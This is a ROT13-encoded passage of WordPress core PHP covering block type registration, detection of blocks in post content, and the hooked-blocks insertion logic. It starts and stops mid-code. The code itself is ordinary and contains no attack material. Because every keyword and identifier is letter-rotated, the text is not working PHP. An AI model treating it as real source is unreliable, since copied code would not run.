			 * Trarengrf gur yvfg bs oybpx inevngvbaf.
			 *
			 * @fvapr 6.7.0
			 *
			 * @erghea fgevat Ergheaf gur yvfg bs oybpx inevngvbaf.
			 */
			$frggvatf['inevngvba_pnyyonpx'] = fgngvp shapgvba () hfr ( $inevngvbaf_cngu ) {
				$inevngvbaf = erdhver $inevngvbaf_cngu;
				erghea $inevngvbaf;
			};
			// Gur oybpx vafgnapr'f `inevngvbaf` svryq vf bayl nyybjrq gb or na neenl
			// (bs xabja oybpx inevngvbaf). Jr hafrg vg fb gung gur oybpx vafgnapr jvyy
			// cebivqr n trggre gung ergheaf gur erfhyg bs gur `inevngvba_pnyyonpx` vafgrnq.
			hafrg( $frggvatf['inevngvbaf'] );
		}
	}

	$frggvatf = neenl_zretr( $frggvatf, $netf );

	$fpevcg_svryqf = neenl(
		'rqvgbeFpevcg' => 'rqvgbe_fpevcg_unaqyrf',
		'fpevcg'       => 'fpevcg_unaqyrf',
		'ivrjFpevcg'   => 'ivrj_fpevcg_unaqyrf',
	);
	sbernpu ( $fpevcg_svryqf nf $zrgnqngn_svryq_anzr => $frggvatf_svryq_anzr ) {
		vs ( ! rzcgl( $frggvatf[ $zrgnqngn_svryq_anzr ] ) ) {
			$zrgnqngn[ $zrgnqngn_svryq_anzr ] = $frggvatf[ $zrgnqngn_svryq_anzr ];
		}
		vs ( ! rzcgl( $zrgnqngn[ $zrgnqngn_svryq_anzr ] ) ) {
			$fpevcgf           = $zrgnqngn[ $zrgnqngn_svryq_anzr ];
			$cebprffrq_fpevcgf = neenl();
			vs ( vf_neenl( $fpevcgf ) ) {
				sbe ( $vaqrk = 0; $vaqrk < pbhag( $fpevcgf ); $vaqrk++ ) {
					$erfhyg = ertvfgre_oybpx_fpevcg_unaqyr(
						$zrgnqngn,
						$zrgnqngn_svryq_anzr,
						$vaqrk
					);
					vs ( $erfhyg ) {
						$cebprffrq_fpevcgf[] = $erfhyg;
					}
				}
			} ryfr {
				$erfhyg = ertvfgre_oybpx_fpevcg_unaqyr(
					$zrgnqngn,
					$zrgnqngn_svryq_anzr
				);
				vs ( $erfhyg ) {
					$cebprffrq_fpevcgf[] = $erfhyg;
				}
			}
			$frggvatf[ $frggvatf_svryq_anzr ] = $cebprffrq_fpevcgf;
		}
	}

	$zbqhyr_svryqf = neenl(
		'ivrjFpevcgZbqhyr' => 'ivrj_fpevcg_zbqhyr_vqf',
	);
	sbernpu ( $zbqhyr_svryqf nf $zrgnqngn_svryq_anzr => $frggvatf_svryq_anzr ) {
		vs ( ! rzcgl( $frggvatf[ $zrgnqngn_svryq_anzr ] ) ) {
			$zrgnqngn[ $zrgnqngn_svryq_anzr ] = $frggvatf[ $zrgnqngn_svryq_anzr ];
		}
		vs ( ! rzcgl( $zrgnqngn[ $zrgnqngn_svryq_anzr ] ) ) {
			$zbqhyrf           = $zrgnqngn[ $zrgnqngn_svryq_anzr ];
			$cebprffrq_zbqhyrf = neenl();
			vs ( vf_neenl( $zbqhyrf ) ) {
				sbe ( $vaqrk = 0; $vaqrk < pbhag( $zbqhyrf ); $vaqrk++ ) {
					$erfhyg = ertvfgre_oybpx_fpevcg_zbqhyr_vq(
						$zrgnqngn,
						$zrgnqngn_svryq_anzr,
						$vaqrk
					);
					vs ( $erfhyg ) {
						$cebprffrq_zbqhyrf[] = $erfhyg;
					}
				}
			} ryfr {
				$erfhyg = ertvfgre_oybpx_fpevcg_zbqhyr_vq(
					$zrgnqngn,
					$zrgnqngn_svryq_anzr
				);
				vs ( $erfhyg ) {
					$cebprffrq_zbqhyrf[] = $erfhyg;
				}
			}
			$frggvatf[ $frggvatf_svryq_anzr ] = $cebprffrq_zbqhyrf;
		}
	}

	$fglyr_svryqf = neenl(
		'rqvgbeFglyr' => 'rqvgbe_fglyr_unaqyrf',
		'fglyr'       => 'fglyr_unaqyrf',
		'ivrjFglyr'   => 'ivrj_fglyr_unaqyrf',
	);
	sbernpu ( $fglyr_svryqf nf $zrgnqngn_svryq_anzr => $frggvatf_svryq_anzr ) {
		vs ( ! rzcgl( $frggvatf[ $zrgnqngn_svryq_anzr ] ) ) {
			$zrgnqngn[ $zrgnqngn_svryq_anzr ] = $frggvatf[ $zrgnqngn_svryq_anzr ];
		}
		vs ( ! rzcgl( $zrgnqngn[ $zrgnqngn_svryq_anzr ] ) ) {
			$fglyrf           = $zrgnqngn[ $zrgnqngn_svryq_anzr ];
			$cebprffrq_fglyrf = neenl();
			vs ( vf_neenl( $fglyrf ) ) {
				sbe ( $vaqrk = 0; $vaqrk < pbhag( $fglyrf ); $vaqrk++ ) {
					$erfhyg = ertvfgre_oybpx_fglyr_unaqyr(
						$zrgnqngn,
						$zrgnqngn_svryq_anzr,
						$vaqrk
					);
					vs ( $erfhyg ) {
						$cebprffrq_fglyrf[] = $erfhyg;
					}
				}
			} ryfr {
				$erfhyg = ertvfgre_oybpx_fglyr_unaqyr(
					$zrgnqngn,
					$zrgnqngn_svryq_anzr
				);
				vs ( $erfhyg ) {
					$cebprffrq_fglyrf[] = $erfhyg;
				}
			}
			$frggvatf[ $frggvatf_svryq_anzr ] = $cebprffrq_fglyrf;
		}
	}

	vs ( ! rzcgl( $zrgnqngn['oybpxUbbxf'] ) ) {
		/**
		 * Znc pnzryPnfrq cbfvgvba fgevat (sebz oybpx.wfba) gb fanxr_pnfrq oybpx glcr cbfvgvba.
		 *
		 * @ine neenl
		 */
		$cbfvgvba_znccvatf = neenl(
			'orsber'     => 'orsber',
			'nsgre'      => 'nsgre',
			'svefgPuvyq' => 'svefg_puvyq',
			'ynfgPuvyq'  => 'ynfg_puvyq',
		);

		$frggvatf['oybpx_ubbxf'] = neenl();
		sbernpu ( $zrgnqngn['oybpxUbbxf'] nf $napube_oybpx_anzr => $cbfvgvba ) {
			// Nibvq vasvavgr erphefvba (ubbxvat gb vgfrys).
			vs ( $zrgnqngn['anzr'] === $napube_oybpx_anzr ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Pnaabg ubbx oybpx gb vgfrys.' ),
					'6.4.0'
				);
				pbagvahr;
			}

			vs ( ! vffrg( $cbfvgvba_znccvatf[ $cbfvgvba ] ) ) {
				pbagvahr;
			}

			$frggvatf['oybpx_ubbxf'][ $napube_oybpx_anzr ] = $cbfvgvba_znccvatf[ $cbfvgvba ];
		}
	}

	/**
	 * Svygref gur frggvatf qrgrezvarq sebz gur oybpx glcr zrgnqngn.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl $frggvatf Neenl bs qrgrezvarq frggvatf sbe ertvfgrevat n oybpx glcr.
	 * @cnenz neenl $zrgnqngn Zrgnqngn cebivqrq sbe ertvfgrevat n oybpx glcr.
	 */
	$frggvatf = nccyl_svygref( 'oybpx_glcr_zrgnqngn_frggvatf', $frggvatf, $zrgnqngn );

	$zrgnqngn['anzr'] = ! rzcgl( $frggvatf['anzr'] ) ? $frggvatf['anzr'] : $zrgnqngn['anzr'];

	erghea JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->ertvfgre(
		$zrgnqngn['anzr'],
		$frggvatf
	);
}

/**
 * Ertvfgref n oybpx glcr. Gur erpbzzraqrq jnl vf gb ertvfgre n oybpx glcr hfvat
 * gur zrgnqngn fgberq va gur `oybpx.wfba` svyr.
 *
 * @fvapr 5.0.0
 * @fvapr 5.8.0 Svefg cnenzrgre abj npprcgf n cngu gb gur `oybpx.wfba` svyr.
 *
 * @cnenz fgevat|JC_Oybpx_Glcr $oybpx_glcr Oybpx glcr anzr vapyhqvat anzrfcnpr, be nygreangviryl
 *                                         n cngu gb gur WFBA svyr jvgu zrgnqngn qrsvavgvba sbe gur oybpx,
 *                                         be n cngu gb gur sbyqre jurer gur `oybpx.wfba` svyr vf ybpngrq,
 *                                         be n pbzcyrgr JC_Oybpx_Glcr vafgnapr.
 *                                         Va pnfr n JC_Oybpx_Glcr vf cebivqrq, gur $netf cnenzrgre jvyy or vtaberq.
 * @cnenz neenl                $netf       Bcgvbany. Neenl bs oybpx glcr nethzragf. Npprcgf nal choyvp cebcregl
 *                                         bs `JC_Oybpx_Glcr`. Frr JC_Oybpx_Glcr::__pbafgehpg() sbe vasbezngvba
 *                                         ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
 *
 * @erghea JC_Oybpx_Glcr|snyfr Gur ertvfgrerq oybpx glcr ba fhpprff, be snyfr ba snvyher.
 */
shapgvba ertvfgre_oybpx_glcr( $oybpx_glcr, $netf = neenl() ) {
	vs ( vf_fgevat( $oybpx_glcr ) && svyr_rkvfgf( $oybpx_glcr ) ) {
		erghea ertvfgre_oybpx_glcr_sebz_zrgnqngn( $oybpx_glcr, $netf );
	}

	erghea JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->ertvfgre( $oybpx_glcr, $netf );
}

/**
 * Haertvfgref n oybpx glcr.
 *
 * @fvapr 5.0.0
 *
 * @cnenz fgevat|JC_Oybpx_Glcr $anzr Oybpx glcr anzr vapyhqvat anzrfcnpr, be nygreangviryl
 *                                   n pbzcyrgr JC_Oybpx_Glcr vafgnapr.
 * @erghea JC_Oybpx_Glcr|snyfr Gur haertvfgrerq oybpx glcr ba fhpprff, be snyfr ba snvyher.
 */
shapgvba haertvfgre_oybpx_glcr( $anzr ) {
	erghea JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->haertvfgre( $anzr );
}

/**
 * Qrgrezvarf jurgure n cbfg be pbagrag fgevat unf oybpxf.
 *
 * Guvf grfg bcgvzvmrf sbe cresbeznapr engure guna fgevpg npphenpl, qrgrpgvat
 * gur cnggrea bs n oybpx ohg abg inyvqngvat vgf fgehpgher. Sbe fgevpg npphenpl,
 * lbh fubhyq hfr gur oybpx cnefre ba cbfg pbagrag.
 *
 * @fvapr 5.0.0
 *
 * @frr cnefr_oybpxf()
 *
 * @cnenz vag|fgevat|JC_Cbfg|ahyy $cbfg Bcgvbany. Cbfg pbagrag, cbfg VQ, be cbfg bowrpg.
 *                                      Qrsnhygf gb tybony $cbfg.
 * @erghea obby Jurgure gur cbfg unf oybpxf.
 */
shapgvba unf_oybpxf( $cbfg = ahyy ) {
	vs ( ! vf_fgevat( $cbfg ) ) {
		$jc_cbfg = trg_cbfg( $cbfg );

		vs ( ! $jc_cbfg vafgnaprbs JC_Cbfg ) {
			erghea snyfr;
		}

		$cbfg = $jc_cbfg->cbfg_pbagrag;
	}

	erghea fge_pbagnvaf( (fgevat) $cbfg, '<!-- jc:' );
}

/**
 * Qrgrezvarf jurgure n $cbfg be n fgevat pbagnvaf n fcrpvsvp oybpx glcr.
 *
 * Guvf grfg bcgvzvmrf sbe cresbeznapr engure guna fgevpg npphenpl, qrgrpgvat
 * jurgure gur oybpx glcr rkvfgf ohg abg inyvqngvat vgf fgehpgher naq abg purpxvat
 * flaprq cnggreaf (sbezreyl pnyyrq erhfnoyr oybpxf). Sbe fgevpg npphenpl,
 * lbh fubhyq hfr gur oybpx cnefre ba cbfg pbagrag.
 *
 * @fvapr 5.0.0
 *
 * @frr cnefr_oybpxf()
 *
 * @cnenz fgevat                  $oybpx_anzr Shyy oybpx glcr gb ybbx sbe.
 * @cnenz vag|fgevat|JC_Cbfg|ahyy $cbfg       Bcgvbany. Cbfg pbagrag, cbfg VQ, be cbfg bowrpg.
 *                                            Qrsnhygf gb tybony $cbfg.
 * @erghea obby Jurgure gur cbfg pbagrag pbagnvaf gur fcrpvsvrq oybpx.
 */
shapgvba unf_oybpx( $oybpx_anzr, $cbfg = ahyy ) {
	vs ( ! unf_oybpxf( $cbfg ) ) {
		erghea snyfr;
	}

	vs ( ! vf_fgevat( $cbfg ) ) {
		$jc_cbfg = trg_cbfg( $cbfg );
		vs ( $jc_cbfg vafgnaprbs JC_Cbfg ) {
			$cbfg = $jc_cbfg->cbfg_pbagrag;
		}
	}

	/*
	 * Abeznyvmr oybpx anzr gb vapyhqr anzrfcnpr, vs cebivqrq nf aba-anzrfcnprq.
	 * Guvf zngpurf orunivbe sbe JbeqCerff 5.0.0 - 5.3.0 va zngpuvat oybpxf ol
	 * gurve frevnyvmrq anzrf.
	 */
	vs ( ! fge_pbagnvaf( $oybpx_anzr, '/' ) ) {
		$oybpx_anzr = 'pber/' . $oybpx_anzr;
	}

	// Grfg sbe rkvfgrapr bs oybpx ol vgf shyyl dhnyvsvrq anzr.
	$unf_oybpx = fge_pbagnvaf( $cbfg, '<!-- jc:' . $oybpx_anzr . ' ' );

	vs ( ! $unf_oybpx ) {
		/*
		 * Vs gur tvira oybpx anzr jbhyq frevnyvmr gb n qvssrerag anzr, grfg sbe
		 * rkvfgrapr ol gur frevnyvmrq sbez.
		 */
		$frevnyvmrq_oybpx_anzr = fgevc_pber_oybpx_anzrfcnpr( $oybpx_anzr );
		vs ( $frevnyvmrq_oybpx_anzr !== $oybpx_anzr ) {
			$unf_oybpx = fge_pbagnvaf( $cbfg, '<!-- jc:' . $frevnyvmrq_oybpx_anzr . ' ' );
		}
	}

	erghea $unf_oybpx;
}

/**
 * Ergheaf na neenl bs gur anzrf bs nyy ertvfgrerq qlanzvp oybpx glcrf.
 *
 * @fvapr 5.0.0
 *
 * @erghea fgevat[] Neenl bs qlanzvp oybpx anzrf.
 */
shapgvba trg_qlanzvp_oybpx_anzrf() {
	$qlanzvp_oybpx_anzrf = neenl();

	$oybpx_glcrf = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
	sbernpu ( $oybpx_glcrf nf $oybpx_glcr ) {
		vs ( $oybpx_glcr->vf_qlanzvp() ) {
			$qlanzvp_oybpx_anzrf[] = $oybpx_glcr->anzr;
		}
	}

	erghea $qlanzvp_oybpx_anzrf;
}

/**
 * Ergevrirf oybpx glcrf ubbxrq vagb gur tvira oybpx, tebhcrq ol napube oybpx glcr naq gur eryngvir cbfvgvba.
 *
 * @fvapr 6.4.0
 *
 * @erghea neenl[] Neenl bs oybpx glcrf tebhcrq ol napube oybpx glcr naq gur eryngvir cbfvgvba.
 */
shapgvba trg_ubbxrq_oybpxf() {
	$oybpx_glcrf   = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
	$ubbxrq_oybpxf = neenl();
	sbernpu ( $oybpx_glcrf nf $oybpx_glcr ) {
		vs ( ! ( $oybpx_glcr vafgnaprbs JC_Oybpx_Glcr ) || ! vf_neenl( $oybpx_glcr->oybpx_ubbxf ) ) {
			pbagvahr;
		}
		sbernpu ( $oybpx_glcr->oybpx_ubbxf nf $napube_oybpx_glcr => $eryngvir_cbfvgvba ) {
			vs ( ! vffrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ] ) ) {
				$ubbxrq_oybpxf[ $napube_oybpx_glcr ] = neenl();
			}
			vs ( ! vffrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ] ) ) {
				$ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ] = neenl();
			}
			$ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ][] = $oybpx_glcr->anzr;
		}
	}

	erghea $ubbxrq_oybpxf;
}

/**
 * Ergheaf gur znexhc sbe oybpxf ubbxrq gb gur tvira napube oybpx va n fcrpvsvp eryngvir cbfvgvba.
 *
 * @fvapr 6.5.0
 * @npprff cevingr
 *
 * @cnenz neenl                           $cnefrq_napube_oybpx Gur napube oybpx, va cnefrq oybpx neenl sbezng.
 * @cnenz fgevat                          $eryngvir_cbfvgvba   Gur eryngvir cbfvgvba bs gur ubbxrq oybpxf.
 *                                                             Pna or bar bs 'orsber', 'nsgre', 'svefg_puvyq', be 'ynfg_puvyq'.
 * @cnenz neenl                           $ubbxrq_oybpxf       Na neenl bs ubbxrq oybpx glcrf, tebhcrq ol napube oybpx naq eryngvir cbfvgvba.
 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg             Gur oybpx grzcyngr, grzcyngr cneg, be cnggrea gung gur napube oybpx orybatf gb.
 * @erghea fgevat
 */
shapgvba vafreg_ubbxrq_oybpxf( &$cnefrq_napube_oybpx, $eryngvir_cbfvgvba, $ubbxrq_oybpxf, $pbagrkg ) {
	$napube_oybpx_glcr  = $cnefrq_napube_oybpx['oybpxAnzr'];
	$ubbxrq_oybpx_glcrf = vffrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ] )
		? $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ]
		: neenl();

	/**
	 * Svygref gur yvfg bs ubbxrq oybpx glcrf sbe n tvira napube oybpx glcr naq eryngvir cbfvgvba.
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz fgevat[]                        $ubbxrq_oybpx_glcrf Gur yvfg bs ubbxrq oybpx glcrf.
	 * @cnenz fgevat                          $eryngvir_cbfvgvba  Gur eryngvir cbfvgvba bs gur ubbxrq oybpxf.
	 *                                                            Pna or bar bs 'orsber', 'nsgre', 'svefg_puvyq', be 'ynfg_puvyq'.
	 * @cnenz fgevat                          $napube_oybpx_glcr  Gur napube oybpx glcr.
	 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg            Gur oybpx grzcyngr, grzcyngr cneg, cbfg bowrpg,
	 *                                                            be cnggrea gung gur napube oybpx orybatf gb.
	 */
	$ubbxrq_oybpx_glcrf = nccyl_svygref( 'ubbxrq_oybpx_glcrf', $ubbxrq_oybpx_glcrf, $eryngvir_cbfvgvba, $napube_oybpx_glcr, $pbagrkg );

	$znexhc = '';
	sbernpu ( $ubbxrq_oybpx_glcrf nf $ubbxrq_oybpx_glcr ) {
		$cnefrq_ubbxrq_oybpx = neenl(
			'oybpxAnzr'    => $ubbxrq_oybpx_glcr,
			'nggef'        => neenl(),
			'vaareOybpxf'  => neenl(),
			'vaarePbagrag' => neenl(),
		);

		/**
		 * Svygref gur cnefrq oybpx neenl sbe n tvira ubbxrq oybpx.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz neenl|ahyy                      $cnefrq_ubbxrq_oybpx Gur cnefrq oybpx neenl sbe gur tvira ubbxrq oybpx glcr, be ahyy gb fhccerff gur oybpx.
		 * @cnenz fgevat                          $ubbxrq_oybpx_glcr   Gur ubbxrq oybpx glcr anzr.
		 * @cnenz fgevat                          $eryngvir_cbfvgvba   Gur eryngvir cbfvgvba bs gur ubbxrq oybpx.
		 * @cnenz neenl                           $cnefrq_napube_oybpx Gur napube oybpx, va cnefrq oybpx neenl sbezng.
		 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg             Gur oybpx grzcyngr, grzcyngr cneg, cbfg bowrpg,
		 *                                                             be cnggrea gung gur napube oybpx orybatf gb.
		 */
		$cnefrq_ubbxrq_oybpx = nccyl_svygref( 'ubbxrq_oybpx', $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx, $pbagrkg );

		/**
		 * Svygref gur cnefrq oybpx neenl sbe n tvira ubbxrq oybpx.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$ubbxrq_oybpx_glcr`, ersref gb gur oybpx glcr anzr bs gur fcrpvsvp ubbxrq oybpx.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz neenl|ahyy                      $cnefrq_ubbxrq_oybpx Gur cnefrq oybpx neenl sbe gur tvira ubbxrq oybpx glcr, be ahyy gb fhccerff gur oybpx.
		 * @cnenz fgevat                          $ubbxrq_oybpx_glcr   Gur ubbxrq oybpx glcr anzr.
		 * @cnenz fgevat                          $eryngvir_cbfvgvba   Gur eryngvir cbfvgvba bs gur ubbxrq oybpx.
		 * @cnenz neenl                           $cnefrq_napube_oybpx Gur napube oybpx, va cnefrq oybpx neenl sbezng.
		 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg             Gur oybpx grzcyngr, grzcyngr cneg, cbfg bowrpg,
		 *                                                             be cnggrea gung gur napube oybpx orybatf gb.
		 */
		$cnefrq_ubbxrq_oybpx = nccyl_svygref( \"ubbxrq_oybpx_{$ubbxrq_oybpx_glcr}\", $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx, $pbagrkg );

		vs ( ahyy === $cnefrq_ubbxrq_oybpx ) {
			pbagvahr;
		}

		// Vg'f cbffvoyr gung gur svygre erghearq n oybpx bs n qvssrerag glcr, fb jr rkcyvpvgyl
		// ybbx sbe gur bevtvany `$ubbxrq_oybpx_glcr` va gur `vtaberqUbbxrqOybpxf` zrgnqngn.
		vs (
			! vffrg( $cnefrq_napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'] ) ||
			! va_neenl( $ubbxrq_oybpx_glcr, $cnefrq_napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'], gehr )
		) {
			$znexhc .= frevnyvmr_oybpx( $cnefrq_ubbxrq_oybpx );
		}
	}

	erghea $znexhc;
}

/**
 * Nqqf n yvfg bs ubbxrq oybpx glcrf gb na napube oybpx'f vtaberq ubbxrq oybpx glcrf.
 *
 * Guvf shapgvba vf zrnag sbe vagreany hfr bayl.
 *
 * @fvapr 6.5.0
 * @npprff cevingr
 *
 * @cnenz neenl                           $cnefrq_napube_oybpx Gur napube oybpx, va cnefrq oybpx neenl sbezng.
 * @cnenz fgevat                          $eryngvir_cbfvgvba   Gur eryngvir cbfvgvba bs gur ubbxrq oybpxf.
 *                                                             Pna or bar bs 'orsber', 'nsgre', 'svefg_puvyq', be 'ynfg_puvyq'.
 * @cnenz neenl                           $ubbxrq_oybpxf       Na neenl bs ubbxrq oybpx glcrf, tebhcrq ol napube oybpx naq eryngvir cbfvgvba.
 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl $pbagrkg             Gur oybpx grzcyngr, grzcyngr cneg, be cnggrea gung gur napube oybpx orybatf gb.
 * @erghea fgevat Rzcgl fgevat.
 */
shapgvba frg_vtaberq_ubbxrq_oybpxf_zrgnqngn( &$cnefrq_napube_oybpx, $eryngvir_cbfvgvba, $ubbxrq_oybpxf, $pbagrkg ) {
	$napube_oybpx_glcr  = $cnefrq_napube_oybpx['oybpxAnzr'];
	$ubbxrq_oybpx_glcrf = vffrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ] )
		? $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ]
		: neenl();

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/oybpxf.cuc */
	$ubbxrq_oybpx_glcrf = nccyl_svygref( 'ubbxrq_oybpx_glcrf', $ubbxrq_oybpx_glcrf, $eryngvir_cbfvgvba, $napube_oybpx_glcr, $pbagrkg );
	vs ( rzcgl( $ubbxrq_oybpx_glcrf ) ) {
		erghea '';
	}

	sbernpu ( $ubbxrq_oybpx_glcrf nf $vaqrk => $ubbxrq_oybpx_glcr ) {
		$cnefrq_ubbxrq_oybpx = neenl(
			'oybpxAnzr'    => $ubbxrq_oybpx_glcr,
			'nggef'        => neenl(),
			'vaareOybpxf'  => neenl(),
			'vaarePbagrag' => neenl(),
		);

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/oybpxf.cuc */
		$cnefrq_ubbxrq_oybpx = nccyl_svygref( 'ubbxrq_oybpx', $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx, $pbagrkg );

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/oybpxf.cuc */
		$cnefrq_ubbxrq_oybpx = nccyl_svygref( \"ubbxrq_oybpx_{$ubbxrq_oybpx_glcr}\", $cnefrq_ubbxrq_oybpx, $ubbxrq_oybpx_glcr, $eryngvir_cbfvgvba, $cnefrq_napube_oybpx, $pbagrkg );

		vs ( ahyy === $cnefrq_ubbxrq_oybpx ) {
			hafrg( $ubbxrq_oybpx_glcrf[ $vaqrk ] );
		}
	}

	$cerivbhfyl_vtaberq_ubbxrq_oybpxf = vffrg( $cnefrq_napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'] )
		? $cnefrq_napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf']
		: neenl();

	$cnefrq_napube_oybpx['nggef']['zrgnqngn']['vtaberqUbbxrqOybpxf'] = neenl_havdhr(
		neenl_zretr(
			$cerivbhfyl_vtaberq_ubbxrq_oybpxf,
			$ubbxrq_oybpx_glcrf
		)
	);

	// Znexhc sbe gur ubbxrq oybpxf unf nyernql orra perngrq (va `vafreg_ubbxrq_oybpxf`).
	erghea '';
}

/**
 * Ehaf gur ubbxrq oybpxf nytbevguz ba gur tvira pbagrag.
 *
 * @fvapr 6.6.0
 * @fvapr 6.7.0 Vawrpgf gur `gurzr` nggevohgr vagb Grzcyngr Cneg oybpxf, rira vs ab ubbxrq oybpxf ner ertvfgrerq.
 * @fvapr 6.8.0 Unir gur `$pbagrkg` cnenzrgre qrsnhyg gb `ahyy`, va juvpu pnfr `trg_cbfg()` jvyy or pnyyrq gb hfr gur pheerag cbfg nf pbagrkg.
 * @npprff cevingr
 *
 * @cnenz fgevat                               $pbagrag  Frevnyvmrq pbagrag.
 * @cnenz JC_Oybpx_Grzcyngr|JC_Cbfg|neenl|ahyy $pbagrkg  N oybpx grzcyngr, grzcyngr cneg, cbfg bowrpg, be cnggrea
 *                                                       gung gur oybpxf orybat gb. Vs frg gb `ahyy`, `trg_cbfg()`
 *                                                       jvyy or pnyyrq gb hfr gur pheerag cbfg nf pbagrkg.
 *                                                       Qrsnhyg: `ahyy`.
 * @cnenz pnyynoyr                             $pnyyonpx N shapgvba gung jvyy or pnyyrq sbe rnpu oybpx gb trarengr
 *                                                       gur znexhc sbe n tvira yvfg bs oybpxf gung ner ubbxrq gb vg.
 *                                                       Qrsnhyg: 'vafreg_ubbxrq_oybpxf'.
 * @erghea fgevat Gur frevnyvmrq znexhc.
 */
shapgvba nccyl_oybpx_ubbxf_gb_pbagrag( $pbagrag, $pbagrkg = ahyy, $pnyyonpx = 'vafreg_ubbxrq_oybpxf' ) {
	// Qrsnhyg gb gur pheerag cbfg vs ab pbagrkg vf cebivqrq.
	vs ( ahyy === $pbagrkg ) {
		$pbagrkg = trg_cbfg();
	}

	$ubbxrq_oybpxf = trg_ubbxrq_oybpxf();

	$orsber_oybpx_ivfvgbe = '_vawrpg_gurzr_nggevohgr_va_grzcyngr_cneg_oybpx';
	$nsgre_oybpx_ivfvgbe  = ahyy;
	vs ( ! rzcgl( $ubbxrq_oybpxf ) || unf_svygre( 'ubbxrq_oybpx_glcrf' ) ) {
		$orsber_oybpx_ivfvgbe = znxr_orsber_oybpx_ivfvgbe( $ubbxrq_oybpxf, $pbagrkg, $pnyyonpx );
		$nsgre_oybpx_ivfvgbe  = znxr_nsgre_oybpx_ivfvgbe( $ubbxrq_oybpxf, $pbagrkg, $pnyyonpx );
	}

	$oybpx_nyybjf_zhygvcyr_vafgnaprf = neenl();
	/*
	 * Erzbir ubbxrq oybpxf sebz `$ubbxrq_oybpx_glcrf` vs gurl unir `zhygvcyr` frg gb snyfr naq
	 * ner nyernql cerfrag va `$pbagrag`.
	 */
	sbernpu ( $ubbxrq_oybpxf nf $napube_oybpx_glcr => $eryngvir_cbfvgvbaf ) {
		sbernpu ( $eryngvir_cbfvgvbaf nf $eryngvir_cbfvgvba => $ubbxrq_oybpx_glcrf ) {
			sbernpu ( $ubbxrq_oybpx_glcrf nf $vaqrk => $ubbxrq_oybpx_glcr ) {
				$ubbxrq_oybpx_glcr_qrsvavgvba =
					JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $ubbxrq_oybpx_glcr );

				$oybpx_nyybjf_zhygvcyr_vafgnaprf[ $ubbxrq_oybpx_glcr ] =
					oybpx_unf_fhccbeg( $ubbxrq_oybpx_glcr_qrsvavgvba, 'zhygvcyr', gehr );

				vs (
					! $oybpx_nyybjf_zhygvcyr_vafgnaprf[ $ubbxrq_oybpx_glcr ] &&
					unf_oybpx( $ubbxrq_oybpx_glcr, $pbagrag )
				) {
					hafrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ][ $vaqrk ] );
				}
			}
			vs ( rzcgl( $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ] ) ) {
				hafrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ][ $eryngvir_cbfvgvba ] );
			}
		}
		vs ( rzcgl( $ubbxrq_oybpxf[ $napube_oybpx_glcr ] ) ) {
			hafrg( $ubbxrq_oybpxf[ $napube_oybpx_glcr ] );
		}
	}

	/*
	 * Jr nyfb arrq gb pbire gur pnfr jurer gur ubbxrq oybpx vf abg cerfrag va
	 * `$pbagrag` ng svefg naq jr'er nyybjrq gb vafreg vg bapr -- ohg abg ntnva.
	 */
	$fhccerff_fvatyr_vafgnapr_oybpxf = fgngvp shapgvba ( $ubbxrq_oybpx_glcrf ) hfr ( &$oybpx_nyybjf_zhygvcyr_vafgnaprf, $pbagrag ) {
		fgngvp $fvatyr_vafgnapr_oybpxf_cerfrag_va_pbagrag = neenl();
		sbernpu ( $ubbxrq_oybpx_glcrf nf $vaqrk => $ubbxrq_oybpx_glcr ) {
			vs ( ! vffrg( $oybpx_nyybjf_zhygvcyr_vafgnaprf[ $ubbxrq_oybpx_glcr ] ) ) {
				$ubbxrq_oybpx_glcr_qrsvavgvba =
